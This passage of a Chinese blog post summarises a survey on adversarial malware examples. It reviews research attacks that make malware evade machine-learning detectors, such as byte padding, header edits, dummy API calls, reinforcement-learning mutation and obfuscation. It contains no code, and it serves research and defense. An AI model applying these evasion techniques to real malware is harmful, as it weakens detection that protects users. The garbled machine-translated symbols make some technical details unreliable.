<p><strong>【Malconv】</strong>Raff等人采用了一种不同的方法，并提出了一种卷积神经网络（CNN）模型，该模型将整个二进制作为输入[62]。特别地，所提出的模型MalConv查看文件的原始字节以确定恶意。MalConv借鉴了神经网络的研究，从长序列中学习更高级别的表示，并依赖于CNN捕捉高级别局部不变量的能力。MalConv通过提取文件的：字节来工作。这些：用0G5字节填充字节，以创建大小为3的特征向量。如果：&gt;3，则使用文件的前3个字节，而不使用任何额外的填充。通过与CNN联合学习的嵌入，将这个3长度的向量映射到固定长度的特征向量。</p>
</blockquote>
<h4><span id="212-dynamic-features">2.1.2 Dynamic Features</span></h4>
<blockquote>
<p>动态分析是一种通过在实时环境中运行二进制文件来分析二进制文件的技术。此环境通常是一个安全的沙盒或测试环境，如CWSandbox[80]和cuckoo
sandbox[1]，以确保主机的安全。通常，这些环境都经过大量检测，以便记录已执行和加载的代码以及对内部文件、目录和设置所做的任何更改。这些记录的特征称为动态特征。</p>
<p>提取动态特征的最常用方法是记录系统和API调用的频率和顺序[3,21]。例如，<strong>Accessminer</strong>在动态分析期间记录系统调用trace，并生成每个样本的n-grams表示[42]。Accessminer将一个样本标记为恶意软件，如果该样本相对于某个预定义阈值包含多个“恶意”=-grams实例。动态分析的另一个好处是可以捕获和分析网络流量和通信，如Taintdroid[22]所述。这些功能还可用于为其他功能生成不同的恶意软件表示，或降低维数。</p>
<p>Bailey等人提出了一种用于恶意软件自动分类和分析的动态分析工具，该工具使用动态分析来记录生成的新进程、修改的任何文件、修改的任何注册表项以及网络访问和使用情况[11]。这些记录的特征用于创建amalware指纹，该指纹关注的是状态变化，而不是代码序列。这些动态特征用于使用标准化压缩距离度量创建恶意软件样本的层次聚类。</p>
<p>Rieck等人使用CWSandbox进行动态分析，类似于Bailey等人的工作，但是，使用字符串从结果文本报告中提取特征[63]。字符串频率与SVMto一起用于分类恶意软件样本。作者还表明，他们的方法可以通过引入新的“未知”类而扩展到恶意软件检测，而无需在训练集中引入良性样本。</p>
<p>拜耳等人通过使用污染分析来了解可执行文件如何使用来自操作系统的信息，从而扩展了之前的工作[12]。此外，所提出的方法使用操作系统对象和操作的抽象来创建行为概要。作者认为，由于能够在没有虚假系统调用的情况下对程序进行抽象或推理，因此抽象对规避更具鲁棒性。然后，将提取的行为特征与基于位置敏感哈希的聚类算法结合使用，对恶意软件样本进行分类。</p>
<p>程序的行为也可以建模为图，如Kolbitsch等人的工作[35]。作者扩展了malspec[18]，并使用systemcalls生成了程序的行为图。每个行为图都是一个有向无环图，其中节点是系统调用，有向边表示信息流。使用图匹配和相似性度量对已知恶意软件样本进行检测。</p>
</blockquote>
<h4><span id="22-adversarial-examples">2.2 Adversarial examples</span></h4>
<blockquote>
<p>定义-&gt;图片等领域的限制条件-&gt;常用方法介绍-&gt;</p>
<p>在[72]中首次引入了对抗性示例的概念，并在[28]中进行了扩展。假设5是敌方计划攻击的目标分类器。这个分类器可以表示为一个函数<span class="math inline">\(f(x)\)</span>，它接受一个输入并给它分配一个标签。通过用X扰动原始输入f生成对抗性示例x′5，使5（G）≠
5（G′）。</p>
<p>有很多方法可以找到X，最流行的是快速梯度符号法[28]和卡里尼·瓦格纳（C&amp;W）攻击[15]用于白盒模型，而<strong>替代模型攻击</strong>[55]用于黑盒模型。大多数攻击都会使用损失函数相对于输入的梯度来找到输入必须扰动的方向，以使输出发生想要的变化。然后使用该方向来查找X。我们在附录中简要讨论了这些攻击和其他攻击。</p>
</blockquote>
<h4><span id="221-threat-models">2.2.1 Threat models.</span></h4>
<p>威胁模型是研究中对攻击者能力和已知信息的明确定义。在本节中，我们定义了机器学习领域中广泛使用的<strong>白盒</strong>和黑盒威胁模型。威胁模型由三部分组成：<strong>威胁向量和威胁面、知识和能力</strong>。</p>
<p><strong>威胁向量和威胁面</strong>：威胁向量和威胁面表示攻击者与目标模型交互的方式。威胁向量是攻击者可以用来攻击模型的允许输入空间和位置。威胁面或攻击面是所有此类威胁向量的集合。通常情况下，威胁向量和威胁面由机器学习模型的输入和输出组成。然而，攻击者进入这些表面的能力进一步受到其知识和能力的限制。</p>
<p><strong>Knowledge:</strong>攻击者的知识表示我们假设对攻击者了解<strong>目标模型的内容</strong>。然后，攻击者利用这些知识构建并发起攻击。在对抗式机器学习中，可以将攻击者的知识概括为白盒和黑盒模型。在白盒模型中，假设攻击者对系统有完全的了解。因此，我们假设攻击者可以完全访问目标机器学习模型（带有权重和参数）以及用于训练模型的数据。在黑箱模型中，假设攻击者只能访问模型的输入和输出。因此，攻击者不知道模型的内部或训练过程（例如，从可执行文件和梯度信息中提取的特征）。<strong>攻击者也可以建模为灰盒模型。在灰箱模型中，攻击者可以访问模型的输入、输出和一些其他信息（模型使用的特征）等。</strong></p>
<blockquote>
<p>本研究中回顾的作品与攻击者的知识并不完全一致。具体地说，有些作品可能假设攻击者还可以访问恶意软件源代码，而其他作品则没有。在第3节中，将明确指出每部作品与对抗性知识的一般定义之间的偏差</p>
</blockquote>
<p><strong>能力</strong>：攻击者的能力表示我们假设对攻击者可以发动的攻击类型。在对抗样本中，我们可以指定攻击者将使用的<strong>攻击算法</strong>。在恶意软件领域的对抗性示例中，攻击者的能力受到其知识的限制。例如，通过访问恶意软件源代码，攻击者可以轻松地在编译时应用特定的转换。但是，如果没有源代码，这将变得更加困难。</p>
<h4><span id="222-adversarial-malwareexamples">2.2.2 Adversarial malware
examples</span></h4>
<blockquote>
<p>大多数对抗性示例研究是使用自然图像数据集进行的，如MNIST、CIFAR10和ImageNet。然而，有必要考虑一组<strong>允许干扰攻击者恶意软件实例功能的允许扰动</strong>。</p>
</blockquote>
<blockquote>
<p>对于自然图像，像素值会受到干扰以生成一个对抗性示例。只要得到的像素值在0到255之间，像素值的任何负数或正数变化都会导致图像发生轻微变化。可执行程序可以用类似的方式表示。根据定义，二进制文件的每个字节都在0x00和0xff之间。每个字节的十六进制表示可以转换为其十进制等效值（0到255之间）。在此状态下，可以使用相同的方法扰动字节和像素。然而，对字节的任意扰动可能不会产生有效的可执行文件，因为可执行程序存在于离散空间中。考虑改变可执行文件的一个字节的简单情况。如果字节来自ELF的.text部分，则新修改的字节可能会通过更改函数参数或导致错误指令而中断程序的功能。因此，将对抗性示例技术应用于恶意软件领域需要特别注意二进制文件的构造。最重要的是，对抗性恶意软件示例必须包含与原始恶意程序相同的恶意程序逻辑和功能。</p>
</blockquote>
<p><strong>对抗性恶意软件示例是一种直接的威胁，因为它们是规避性的恶意可执行文件，可以利用许多商业防病毒软件对混淆和变异的持久漏洞</strong>[61]。<strong>这将实际的恶意软件示例与恶意特征向量区分开来。虽然恶意特征向量也可以逃避检测或分类，但没有直接威胁</strong>。<strong>Pierazzi等人认为，在给定敌对特征向量的情况下生成可执行文件是困难的，并将其称为反向特征映射问题。逆特征映射问题没有唯一的解决方案</strong>。在n-gram分类器的简单情况下，可以通过多种方式添加n-gram。但是，它们并不能保证产生与原始恶意软件样本包含相同程序逻辑或可执行性的可执行文件。当处理黑盒模型时，这个问题变得更加困难，因为攻击者不知道分类器的输入和内部结构。Pierazzi等人解释说，实际的恶意软件示例有两种方法可以避免这种情况：</p>
<p>（1）一种梯度驱动方法，其中代码扰动对梯度的影响是近似的，并用于遵循梯度的方向；</p>
<p>（2）一种问题驱动方法，其中突变首先随机应用，然后再开始一种进化的方法。</p>
<h4><span id="3-practical-attacks">3 PRACTICAL ATTACKS</span></h4>
<blockquote>
<p>在本节中，我们将回顾对抗性恶意软件示例文献中的实际攻击，或导致可执行二进制文件的攻击。在表3中，我们概述了本工作中的实际攻击记录（1）如果工作是针对使用静态功能的恶意软件分类器评估的（2）如果工作是针对使用动态功能的恶意软件分类器评估的，（3）评估中的targetmodels，（4）攻击中的可用转换，（5）该方法是梯度驱动还是问题驱动。</p>
</blockquote>
<blockquote>
<p>我们使用[59]中的术语，并按照第2.2.2节中定义的梯度驱动和问题驱动方法组织我们的审查。对于这两种方法，我们进一步将文献组织为第3.1.1和3.2.1节中主要编辑字节和元数据的攻击，以及第3.1.2和3.2.2节中利用代码转换的攻击。</p>
</blockquote>
<figure>
<img src="image-20210415140727064.png" alt="image-20210415140727064">
<figcaption aria-hidden="true">image-20210415140727064</figcaption>
</figure>
<ul class="task-list">
<li><p><input type="checkbox" checked>[65] Generic Black-Box
End-to-End Attack Against State of the Art API Call Based Malware
Classifiers</p></li>
<li><p><input type="checkbox">[6] Learning to Evade Static PE Machine
Learning Malware Models via <strong>Reinforcement
Learning</strong></p></li>
<li><p><input type="checkbox" checked>[36] <strong>Adversarial
Malware Binaries: Evading Deep Learning for Malware Detection in
Executables</strong></p></li>
<li><p><input type="checkbox" checked>[39] <strong>Deceiving
End-to-End Deep Learning Malware Detectors using Adversarial
Examples</strong></p></li>
<li><p><input type="checkbox" checked>[20] Explaining
Vulnerabilities of Deep Learning to Adversarial Malware
Binaries</p></li>
<li><p><input type="checkbox">[57] Generation &amp; Evaluation of
Adversarial Examples for Malware Obfuscation.</p></li>
<li><p><input type="checkbox" checked><strong>[68]</strong>
<strong>Automatic Generation</strong> of Adversarial Examples for
Interpreting Malware Classifiers</p></li>
<li><p><input type="checkbox">[83] Malware Detection in Adversarial
Settings: Exploiting Feature Evolutions and Confusions in Android
Apps.</p></li>
<li><p><input type="checkbox">[40] Deceiving Portable Executable
Malware Classifiers into Targeted Misclassification with Practical
Adversarial Examples</p></li>
<li><p><input type="checkbox" checked>[59] <strong>Intriguing
Properties of Adversarial ML Attacks in the Problem Space (2020
S&amp;P)</strong></p></li>
<li><p><input type="checkbox">[24] <strong>HideNoSeek: Camouflaging
Malicious JavaScript in Benign ASTs (2019 CCS)</strong></p></li>
</ul>
<h4><span id="31-gradient-driven-approaches">3.1 Gradient-driven approaches</span></h4>
<h4><span id="311-editing-bytes-andmetadata">3.1.1 Editing bytes and
metadata</span></h4>
<blockquote>
<p>创建实际恶意软件示例的一种流行方法是在二进制文件中的未使用空间中添加或更改字节。此外，这可以在头中完成，以在不影响功能的情况下更改头元数据。在本节中，我们将回顾使用这种类型转换的拟议攻击。因为这些攻击集中在未使用或“不重要”（用于执行）字节上，所以它们不需要源代码来生成规避恶意软件样本。然而，除了GADGET[65]之外，这些攻击仍然是白盒攻击，因为它们需要完全访问目标模型来计算梯度。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox" checked>##### <strong>[65] Generic
Black-Box End-to-End Attack Against State of the Art API Call Based
Malware Classifiers</strong></li>
</ul>
<p>2018年，Rosenberg等人提出了GADGET，这是一个利用DNN之间对抗样本的可转移性将PE恶意软件转化为规避变体的软件框架[65]。提议的攻击假设一个黑盒威胁模型，无法访问恶意软件源代码。但是，攻击假设目标模型将一系列API调用作为输入。为了生成对抗性示例，GADGET构建了一个代理或替代模型，该模型使用Papernot等人提出的基于Jacobian的数据集扩充进行训练，作为对自然图像分类器的攻击[55]。数据集扩充创建合成输入，帮助替代模型更好地逼近目标黑盒模型的决策边界。这增加了攻击可转移性的概率，因为替代模型和目标模型都将学习到类似的分布。一旦替代模型得到训练，通过向原始恶意软件的API调用序列添加虚拟API调用，生成对抗性恶意软件示例。作者将这些伪API调用称为语义NOP作为所选的API调用，或者它们相应的参数对原始程序逻辑没有影响。需要注意的是，作者只添加API调用，因为删除API调用可能会破坏程序的功能。</p>
<blockquote>
<p>算法介绍：假设原始API调用序列是一个数组F0，其中每个索引都是9∈
[0，=]包含一个API调用。此过程的每个迭代8都返回一个新数组F8。在迭代8中，一个API调用3被添加到F8中−1在某个指数9处，将其推向梯度指示的方向，该梯度对替代模型的决策影响最大。这将导致F8，其中F8[9]=3和F8[9+1::]=F8−1[9:]因为索引9之后的前一序列中的所有API调用基本上都是“向后推”的。</p>
</blockquote>
<p>这种通过添加伪API调用来干扰输入的方法确保了功能不会被破坏。为了从这个对抗性API调用序列生成实际的可执行文件，GADGET实现了一个钩住所有API调用的包装器。钩子根据需要从敌对API调用序列调用原始API和虚拟API。这些钩子确保生成的敌对恶意软件示例在某种意义上保持原始样本的功能和行为。GADGET根据定制模型进行评估，包括logistic回归、递归神经网络（RNN）、全连接深度神经网络（DNN）、卷积神经网络（CNN）、支持向量机、增强决策树和随机森林分类器。作者还表明，他们的攻击产生的恶意软件能够避开使用静态特征（如可打印字符串）的分类器。</p>
<ul class="task-list">
<li><input type="checkbox" checked><strong>[36] Adversarial Malware
Binaries: Evading Deep Learning for Malware Detection in
Executables</strong></li>
</ul>
<blockquote>
<p>Kolosnjaji等人提出了一种针对MalConv的白盒攻击，该攻击通过迭代操作文件末尾的填充字节来生成对抗性PE恶意软件示例[36]。尽管作者指出PE中任何位置的字节都可以更改，但它需要对文件体系结构的精确了解，因为简单的更改可能会破坏文件完整性。因此，提议的攻击只关注字节附加。作者面临的一个挑战是由于其嵌入层，MALCONV的不可微性。为了避免这种情况，作者建议计算目标函数相对于嵌入表示I的梯度，而不是输入。每个填充字节都替换为最靠近第6行的嵌入式字节&lt;（[）=I+[=其中=是标准化的渐变方向。但是，如果第6行（[）上的“&lt;”投影未与=”对齐，则选择下一个最近的嵌入字节。通过仅更改文件末尾的填充，提议的攻击不会更改程序逻辑或原始almarware示例的功能。<strong>但是，这也限制了攻击允许的干扰总数</strong>。如第2节所述，MalConv从二进制文件中最多提取3个字节。如果二进制文件的大小小于3，则提取的：字节数为（3−
:)
附加到它的0xff填充字节。这意味着提议的攻击受到原始恶意软件样本大小的限制。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox" checked><strong>[39] Deceiving
End-to-End Deep Learning Malware Detectors using Adversarial
Examples</strong></li>
</ul>
<blockquote>
<p>Kruek等人[39]扩展了Kolosnjaji等人的工作，提出了一种方法，用于在敌对示例嵌入的情况下重建PE恶意软件样本。作者发现，从扰动嵌入重建字节∗
像我一样经常是不平凡的∗ 可能会与我失去相似之处∈ /
用于学习“将填充字节映射到嵌入字节的函数。因此，他们提出了一种新的损失函数，以确保扰动嵌入∗
将接近于实际的嵌入”。这是通过在生成的嵌入和“”之间的损失函数中引入距离项来实现的。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox" checked><strong>[20] Explaining
Vulnerabilities of Deep Learning to Adversarial Malware
Binaries</strong></li>
</ul>
<blockquote>
<p>Demetrio等人提出将特征属性作为一种可解释的机器学习算法，以理解机器学习模型做出的决策[20]。特征归因基于Sundararajan等人于2017年引入的一种称为积分梯度的技术[71]。Demetrio等人观察了输入可执行文件的每个字节的属性，发现MalConv对二进制文件的PE头部分的权重很大。作者利用了这一漏洞，提出了针对MalConv的白盒攻击，该攻击只改变恶意软件样本头中的字节。此攻击使用了与[36]中相同的算法，但干扰了头中未使用和可编辑的字节，而不是在文件末尾填充。</p>
</blockquote>
<h4><span id="312-code-transformations">3.1.2 Code transformations</span></h4>
<blockquote>
<p>上面的许多工作都指出，只要程序的功能和恶意行为没有改变，建议的方法就可以用来改变恶意二进制文件的.text部分。以下攻击利用模糊处理技术更改.text部分。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox"><strong>[57] Generation &amp; Evaluation of
Adversarial Examples for Malware Obfuscation.</strong></li>
</ul>
<blockquote>
<p>Park等人提出了一种白盒攻击，该攻击利用语义NOP（如mov
eax、x86汇编中的eax）来创建对抗性PE恶意软件示例[57]。作者攻击了使用可执行文件[52]的图像表示作为输入的卷积神经网络。可执行文件的图像表示将每个字节视为一个像素，并使用字节的十进制值作为像素值。攻击提出了两个步骤。首先，使用FGSM生成对抗性示例。此对抗性示例是一个映像，可能与原始恶意软件示例的功能或恶意行为不同。在第二步中，原始恶意软件样本和生成的敌对图像被用作动态规划算法的输入，该算法使用LLVM过程插入语义NOP。与[65]中添加API调用以类似于生成的对抗性特征向量的方式类似，动态规划算法添加了语义NOP，使得生成的恶意软件样本的图像表示类似于步骤1中生成的敌对图像。作者继续证明，由于敌对示例和干扰的可转移性，这种攻击可以用于黑盒模型[50，
55].
使用一个简单的2层CNN作为替代模型，作者生成了对抗性恶意软件示例，这些示例也避开了黑盒模型，其中一个是使用字节级特征的梯度增强决策树。作者还提到，考虑到恶意软件的源代码，他们的攻击效果最好。然而，在缺乏源代码的情况下，可以使用二进制翻译和重写技术插入必要的语义NOP。需要注意的是，引入这些技术也会引入二进制提升过程中的工件。</p>
</blockquote>
<h4><span id="32-problem-driven-approaches">3.2 Problem-driven approaches</span></h4>
<blockquote>
<p>在本节中，我们将回顾采用问题驱动方法的对抗性恶意软件示例算法。与第3.1节类似，我们使用攻击的可用转换进一步组织审查。问题驱动的方法不需要白盒访问梯度信息的目标。因此，以下方法是黑盒攻击。</p>
</blockquote>
<h4><span id="321-editing-bytes-andmetadata">3.2.1 Editing bytes and
metadata</span></h4>
<ul class="task-list">
<li><input type="checkbox"><strong>[6] Learning to Evade Static PE
Machine Learning Malware Models via Reinforcement Learning</strong>
<ul>
<li>Anderson</li>
</ul></li>
</ul>
<blockquote>
<p>其中，Anderson等人提出了一个具有强化学习代理集[6]。RL代理因产生逃避检测的恶意软件的行为而获得奖励。通过这个游戏，代理学习创建规避恶意软件的策略。提议的攻击利用以下不会改变原始程序逻辑的操作：</p>
<ul>
<li>向导入表中添加从未使用过的函数</li>
<li>更改节名</li>
<li>创建新的但未使用的部分</li>
<li>向节中未使用的空间添加字节</li>
<li>删除签名者信息</li>
<li>更改调试信息</li>
<li>打包或解包二进制文件</li>
<li>修改标题</li>
</ul>
<p>使用这些操作，RL代理能够改变诸如PE元数据、人类可读字符串和字节直方图等特性。在培训阶段发生多达50000个突变后，RL代理根据梯度增强决策树模型进行评估，结果表明该模型能够成功地对恶意软件进行分类[78]。作者指出，他们的对抗性例子应该是功能性的。然而，他们发现，他们的攻击破坏了某些Windows
PE的功能，这些PE使用了不太常见的文件格式或违反PE标准的混淆技巧。作者声称，通过确保二进制检测框架能够正确解析原始恶意软件样本，可以简单地解决这一问题。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox"><strong>[68] Automatic Generation of
Adversarial Examples for Interpreting Malware Classifiers</strong></li>
</ul>
<blockquote>
<p>Song等人在生成对抗性恶意软件示例时采用了不同的方法[68]。提议的攻击随机生成一系列宏操作，并将其应用于原始PE恶意软件样本。重复此操作，直到生成的转化恶意软件逃避检测。一旦恶意软件样本不可信，不必要的宏操作将从应用于其的宏操作序列中删除。这样做是为了最大限度地减少由于某些混淆技巧而意外破坏功能的可能性。剩余的宏操作随后被分解为微操作，以获得更详细的转换跟踪，从而生成恶意软件示例。我们建议读者阅读原始文章，以获得关于每个宏和微操作的更多详细信息，但是，我们在此简要描述它们。宏操作包括以下内容：</p>
<ul>
<li>将字节追加到二进制文件的末尾</li>
<li>将字节追加到节末尾未使用的空间</li>
<li>增加一个新的部分重命名</li>
<li>注销已签名证书</li>
<li>删除调试信息</li>
<li>将标头中的校验和值归零</li>
<li>用语义等价的指令替换指令</li>
</ul>
<p>其中一些宏操作可以分解为一系列较小的操作，称为微操作。例如，追加字节的操作可以分解为一次添加一个字节的序列。作者声称，通过分解每个宏操作，可以深入了解特定操作导致逃避的原因。提出的方法不是利用诸如FGSMor
C&amp;Wattack之类的对抗性示例生成算法，而是试图对机器学习模型提供一种更易于解释的攻击。该方法针对商业防病毒软件进行了评估，并被发现对包含静态和动态分析的分类器有效。</p>
</blockquote>
<h4><span id="322-code-transformation">3.2.2 Code transformation</span></h4>
<ul class="task-list">
<li><input type="checkbox"><strong>[83] Malware Detection in
Adversarial Settings: Exploiting Feature Evolutions and Confusions in
Android Apps.</strong></li>
</ul>
<blockquote>
<p>Yang等人提出了两种对恶意软件样本的攻击，以逃避机器学习模型的检测，但没有使用机器学习算法[83]。建议的进化攻击不是针对错误分类，而是基于变异的上下文特征（由时间特征、区域设置特征和依赖性特征组成）模仿Android恶意软件的自然进化[84]。这是通过混淆工具OCTOPUS自动化这些变异策略并大规模使用它们来识别目标分类器上的“盲点”来实现的。恶意软件家族被组织成系统进化树[69]，以分析家族内的共同特征和不同特征。然后根据可行性和频率对每个特征变异进行排序，并进行排序。然后，顶级G突变用于生成新的恶意软件变体。作者还提出了一种特征混淆攻击来补充进化攻击。特征混淆攻击的目标是修改恶意软件样本，使某些特征与良性样本的特征相似。攻击开始于收集一组混乱的功能，或恶意软件和良性样本共享的一组功能。对于混淆特征集中的每个特征，记录包含该特征的良性和恶意样本数。如果存在更多良性样本，则该特征将添加到“目标特征”列表中。然后，攻击会变异恶意软件样本，使其包含已发现的目标特征，从而增加规避的可能性。针对基于Android学习的恶意软件分类器AppContext[84]和Drebin[7]对提出的方法进行了评估。需要注意的是，虽然攻击不需要白盒访问目标模型，但它确实假设（1）恶意软件源代码和（2）模型使用的功能知识。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox"><strong>[40] Deceiving Portable Executable
Malware Classifiers into Targeted Misclassification with Practical
Adversarial Examples</strong></li>
</ul>
<blockquote>
<p>Kucuk等人认为，敌对恶意软件示例必须避开基于静态和动态机器学习的分类器[40]。因此，他们提出了一种针对PE恶意软件的攻击，利用虚假控制流混淆和API混淆来逃避使用静态和动态特征的模型的检测。应用的控制流混淆基于LLVM-Obfuscator[33]。LLVM模糊器通过使用不透明谓词和从不使用任意指令执行伪基本块，在LLVM-IR级别改变程序的控制流。使用差分分析，作者找到了最佳控制流混淆和伪基本块，以生成一个恶意软件示例。这会干扰静态特性，例如n-grams、操作码频率和导入的API调用。该攻击使用一种遗传算法来最小化所需目标类别的频率特征向量与恶意软件样本之间的Kullback-Leibler（KL）散度。为了规避基于动态API调用的恶意软件分类器，作者使用相同的遗传算法确定哪些API调用必须进行模糊处理，然后使用[70]中介绍的技术进行模糊处理。此外，再次使用相同的遗传算法确定应添加到原始恶意软件样本中的其他API调用序列，类似于[65]所采用的方法。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox" checked><strong>[59] Intriguing
Properties of Adversarial ML Attacks in the Problem Space (2020
S&amp;P)</strong></li>
</ul>
<blockquote>
<p>Pierazzi等人提出了一种针对Android恶意软件分类器Drebin的黑盒攻击[59]。作者提出了一种问题空间方法，使用<a href="Opaque%20predicates%20are%20a%20commonly%20used%20technique%20in%20program%20obfuscatio">不透明谓词</a>反复插入良性代码块，以改变Drebin提取的特征。这些良性代码块是在攻击之前通过分析训练集中的样本来初始化的，这些样本用于识别导致负面或良性标签的代码序列。攻击受到可行性检查的限制，以避免过度转换，从而增加怀疑。此外，使用FlowDroid[8]和So烟灰[75]插入代码块，以最小化副作用或伪影。</p>
</blockquote>
<ul class="task-list">
<li><input type="checkbox"><strong>[24] HideNoSeek: Camouflaging
Malicious JavaScript in Benign ASTs (2019 CCS)</strong></li>
</ul>
<blockquote>
<p>HideNoSeek与其他应用代码转换的攻击不同，它试图通过将抽象语法树（AST）转换为良性来隐藏恶意JavaScript[24]。攻击开始于构建恶意和良性文件的AST，以检测两个类之间共享的子AST或子图。为了创建对抗性示例，HideNoSeek利用随机化、数据模糊和不透明结构插入良性子AST。该攻击还可以重写现有的AST，使其看起来是良性的。这些攻击是在黑盒模型中针对基于Zozzle的定制分类器进行的，Zozzle是一种使用从JavaScript
AST中提取的特征的贝叶斯分类器[19]。</p>
</blockquote>
<h3><span id="4-discussion">4 DISCUSSION</span></h3>
<h4><span id="41-challenges">4.1 Challenges</span></h4>
<blockquote>
<p>首先，还应注意的是，我们绝不会减少或淡化恶意软件领域中不产生可执行恶意软件样本的对抗性示例研究的贡献。然而，我们认为，为了在现实的敌对环境中更好地构建提议的攻击，有必要扩展或包括关于扩展攻击以产生可执行恶意软件样本的可能方法的讨论。随着对抗性示例研究的快速发展，有必要充分了解这些攻击如何过渡到恶意软件检测和网络安全领域。全面开发或概念验证攻击也有助于开发针对敌对恶意软件样本的健壮模型。</p>
</blockquote>
<h4><span id="411-threat-models">4.1.1 Threat models</span></h4>
<blockquote>
<p>这一研究领域的一个挑战是威胁模型的不一致性。我们认为有必要明确定义每项研究中考虑的威胁模型，以便更好地理解攻击的局限性以及作者所做的任何假设。除了对抗性示例文献中使用的一般白盒和黑盒威胁模型外，我们建议包括（1）对源代码可用性的假设，以及（2）由于时间或计算限制对对手进行攻击的可行性。与Papernot等人[55]的工作类似，观察改变对手资源的效果会很有趣，例如，限制目标模型允许的查询数量，或为对手攻击的每次迭代产生成本。</p>
</blockquote>
<h4><span id="412-establishing-baselines">4.1.2 Establishing baselines</span></h4>
<blockquote>
<p>另一个挑战是建立基线和基本真相。在整个审查的论文中，没有一致的数据集，也没有一致的（ML或商业）恶意软件分类器。尽管本次调查中考虑的所有作品都对顶级分类词有很高的漏检率，但我们无法公平地对它们进行评估。在提议的攻击和它们的实验评估之间保持一致将允许更好地比较攻击。然而，如[76]所示，维护一致的数据集和恶意软件分类器以及进行公平评估都会带来自身的挑战。这也将有助于扩展Quarta
et.al.提出的评估，Quarta
et.al.使用他们的框架crAVe表明，简单地混淆或变异恶意软件样本就足以逃避检测，因为并非所有反病毒软件都进行某种形式的动态分析。</p>
</blockquote>
<h4><span id="413-dataset">4.1.3 Dataset</span></h4>
<blockquote>
<p>数据集：虽然将旧恶意软件转换为规避恶意软件确实显示了恶意软件检测中的漏洞，但排除较新的恶意软件样本会带来概念漂移(concept
drift.)的风险。例如，如果恶意软件针对新平台进行了大幅更改，则旧的恶意软件数据集可能无法正确反映恶意功能和行为。良性程序样本也是如此。传统上，良性样本是从新安装的操作系统中刮取的。然而，目前尚不清楚这些预装程序是否反映了用户下载和/或扫描恶意行为的程序。</p>
</blockquote>
<h4><span id="414-malware-classifiers">4.1.4 Malware classifiers</span></h4>
<blockquote>
<p>目前尚不清楚哪种恶意软件分类器最适合评估攻击。正如Song等人所说，假设模型的任何先验知识也是不现实的。我们认为目前没有也不会有一个一致的恶意软件检测模型基线，因为该领域的研究仍在增长。然而，我们建议未来的工作在黑盒威胁模型下评估他们对多分类器的攻击。这将有助于理解攻击在决策过程中使用不同特征的各种检测模型之间的可转移性。</p>
</blockquote>
<h4><span id="42-possible-researchdirections">4.2 Possible research
directions</span></h4>
<h4><span id="421defending-against-practical-adversarial-malware-examples">4.2.1
Defending against practical adversarial malware examples</span></h4>
<blockquote>
<p>一些研究已经在评估恶意软件领域中对抗性训练的使用[4,43]。然而，鲁棒机器学习研究包括许多其他防御策略，如平滑[2]和随机化[60]。目前尚不清楚这些方法是否会转移和防御对抗性恶意软件示例。</p>
</blockquote>
<h4><span id="422relationships-between-obfuscation-and-adversarial-examples">4.2.2
Relationships between obfuscation and adversarial examples</span></h4>
<blockquote>
<p>混淆和敌对示例有一个共同的目标：逃避检测。此外，大多数实用的对抗性恶意软件示例算法都将流行的混淆策略纳入了攻击中。一个可能的研究问题是评估使用更先进的模糊处理方法（如虚拟化）生成对抗性示例的可行性。目前还不清楚对抗性恶意软件示例与更传统的恶意软件规避技术（如Bulazel等人[14]中总结的技术）相比有什么好处。在Song等人[68]和Demetrio等人[20]的工作基础上扩展对抗性恶意软件示例的可解释性，并利用这一点进一步开发规避转换，这也是很有趣的。</p>
</blockquote>
<h4><span id="423integration-of-static-and-dynamic-analysis-techniques">4.2.3
Integration of static and dynamic analysis techniques</span></h4>
<blockquote>
<p>许多经过审查的工作都假设在测试之前没有对恶意软件样本进行高级分析。然而，情况并非总是如此。例如，预处理步骤可用于使用除臭框架（如SATURN[25]）对[57]和[40]产生的规避恶意软件样本进行除臭。未来的攻击和防御工作将考虑使用分类和检测管道，而不是单一的机器学习模型或商业防病毒产品，这将是一件有趣的事情。</p>
</blockquote>
<h4><span id="43-othersurvey-and-systematization-of-knowledge-papers">4.3 Other
Survey and systematization of knowledge papers</span></h4>
<blockquote>
<p>在本节中，我们将对涉及相关主题的知识论文进行其他调查和系统化。袁等人。深入学习的对抗性攻击和防御调查[86]。它们还提供了可以使用对抗性攻击的应用程序和问题域。与这项工作类似，Maiorca等人对基于机器学习的PDF恶意软件检测系统的对抗性攻击进行了调查[48]。Bulazel和Yener调查动态恶意软件分析规避和缓解策略[14]。Ye等人综述了数据挖掘技术在恶意软件检测中的应用[85]。Ucci等人利用机器学习对恶意软件分析进行了调查[74]。最后，van
der
Kuowe等人调查了为公平准确地评估安全性研究而必须考虑的常见基准测试缺陷。</p>
</blockquote>
<h3><span id="5-conclusion">5 CONCLUSION</span></h3>
<blockquote>
<p>我们对恶意软件领域中的实际对抗性示例进行了调查。随着基于机器学习的解决方案开始在工业界和学术界被采用，对抗性示例及其对网络安全领域的影响的研究非常重要。我们希望这项调查将为这一领域的未来研究提供有用的信息。</p>
</blockquote>
<hr>
<h4><span id="遗传算法">遗传算法</span></h4>
<ul>
<li><strong>Robust Android Malware Detection against Adversarial Example
Attacks.</strong> <a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/db/conf/www/www2021.html#LiZYLGC21">WWW
2021</a>: 3603-3612</li>
<li><strong>secml-malware: A Python Library for Adversarial Robustness
Evaluation of Windows Malware Classifiers.</strong> <a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/db/journals/corr/corr2104.html#abs-2104-12848">CoRRabs/2104.12848</a>
(2021)</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/3SMQYQP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
